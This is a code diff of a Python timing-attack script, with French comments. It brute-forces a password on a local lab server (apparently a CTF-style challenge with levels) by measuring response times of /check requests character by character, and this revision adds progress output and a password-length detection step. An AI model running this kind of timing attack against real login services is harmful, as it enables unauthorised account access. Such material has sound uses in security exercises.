@@ -9,7 +9,7 @@ class OnEstDesBrutes:
     def __init__(self):
         self.password = ''
         self.last_time = 0
-        self.password_len = 0
+        self.password_len = 13
         self.url = "http://192.168.137.146:5000"
 
     def request_level(self, level: str):
@@ -26,10 +26,11 @@ class OnEstDesBrutes:
         json = {
             "password": (self.password + letter).ljust(self.password_len, '0')
         }
+        print(f'\rPassword try: {json.get('password')}', end='')
         response = requests.post(url=self.url + '/check', json=json, verify=False)
         if response.status_code == 200 or response.json()['result']:
             if response.json()['result']['Valid']:
-                print(self.password + letter)
+                print(f'Le mot de passe est: {self.password + letter}')
                 return None
             return int(response.json()['result']['time'])
         else:
@@ -39,6 +40,7 @@ class OnEstDesBrutes:
     def brute_force_len_password(self):
         while self.request_pwd('') == 0:
             self.password_len += 1
+        print(f'\nLongueur password: {self.password_len}')
     
     def max_time(self, temps: list[int]) -> int | None:
         if len(temps) < 2:
@@ -57,24 +59,25 @@ class OnEstDesBrutes:
                 t = self.request_pwd(l)
                 if t == None:
                     return
-                print((self.password + l).ljust(self.password_len, '0'), t)
+                print(f' - Time: {t}ms', end='')
             
             time.append(t)
             # Si un temps significatif prends ce caractère au lieu d'attendre la fin de tout les tests
             index = self.max_time(time)
             if index != None:
-                self.password += self.car[index]
-                return 1
+                break
         
         self.password += self.car[time.index(max(time))]
         self.last_time = max(time) - 20
+        print(f'\rNew last_time: {self.last_time}', end='')
         return 1
     
-    def brute_force_password(self, level: int = 0):
-        self.request_level(level)
+    def brute_force_password(self):
         input('Appuyez sur Entrée pour commencer...')
         while self.brute_force_char():
-            print(self.password)
+            print(f'\n\nPassword start with: {self.password}')
 
 a = OnEstDesBrutes()
-a.brute_force_password('0')
+a.request_level('1')
+a.brute_force_len_password()
+a.brute_force_password()
